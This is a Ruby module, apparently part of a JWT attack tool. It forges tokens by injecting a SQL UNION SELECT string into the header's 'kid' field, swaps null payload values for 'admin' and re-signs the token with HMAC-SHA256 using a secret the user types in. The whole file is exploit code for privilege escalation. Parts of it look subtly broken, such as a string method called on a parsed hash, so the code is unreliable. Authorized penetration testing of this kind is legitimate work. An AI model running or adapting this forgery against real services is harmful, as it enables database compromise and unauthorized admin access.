module JWTsql   
    def sqlinjection
        def headertype(token)
            header = JSON.parse(token.header)
            if header["typ"] == "JWT" and header["kid"] and header["alg"] == "HS256"
                puts "***\tHeader could include SQL Injection!\t*** "
                puts "Do you want to get new token with SQL Injection? Yes[y/Y] - No[n/N]"
                condition = General.yesorno
                if condition
                    puts "#\tPlease complete the query!\t#"
                    print "SELECT * FROM DB where '#{header['kid']} UNION SELECT '"
                    val = STDIN.gets.chomp
                    val = "EsasAdamWasHere' UNION SELECT '#{val}"
                    header["kid"] = val
                    header = header.to_json
                    payload = token.payload.to_json
                    payload = JSON.parse(payload)
                    payload = payload.gsub("null",'"admin"')
                    print "Tpye secret: "
                    secret = STDIN.gets.chomp
                    puts "#"*72
                    puts "New Created Header: #{header}"
                    puts "New Created Payload: #{payload}"
                    newtoken = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
                    newtoken.gsub!("=","")
                    newtoken = newtoken+"."+Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, newtoken))
                    puts newtoken
                end
            end
        end
        info = General.try_seperate(ARGS[:jwtoken])
        General.showtoken(ARGS[:jwtoken])
        jwtoken = Token.new(info[0], info[1], info[2], info[3])
        val = General.jwkcheck(jwtoken.header)
        headertype(jwtoken)
    end
end